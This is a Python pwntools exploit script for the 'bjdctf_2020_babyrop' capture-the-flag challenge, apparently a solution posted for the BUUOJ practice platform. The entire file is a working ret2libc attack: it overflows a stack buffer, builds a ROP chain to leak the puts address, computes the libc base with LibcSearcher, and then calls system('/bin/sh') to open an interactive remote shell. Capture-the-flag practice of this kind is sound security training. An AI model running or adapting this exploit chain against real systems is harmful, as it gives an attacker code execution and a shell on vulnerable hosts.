from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
# io = process('./bjdctf_2020_babyrop')
io = remote('node4.buuoj.cn',29623)
elf = ELF('./bjdctf_2020_babyrop')

vul_addr = 0x40067D
pop_rdi_ret = 0x400733
ret = 0x4006AC
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']


payload = cyclic(0x20+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vul_addr)
io.sendlineafter(b'Pull up your sword and tell me u story!\n',payload)

puts_addr = io.recvuntil(b'\n',drop=True)[0:8].ljust(8,b'\x00')
print(puts_addr)
puts_addr = u64(puts_addr)
print('write_addr:',hex(puts_addr))


libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
sh_addr = libcbase + libc.dump('str_bin_sh')

payload = cyclic(0x20+8) + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)
io.sendline(payload)

io.interactive()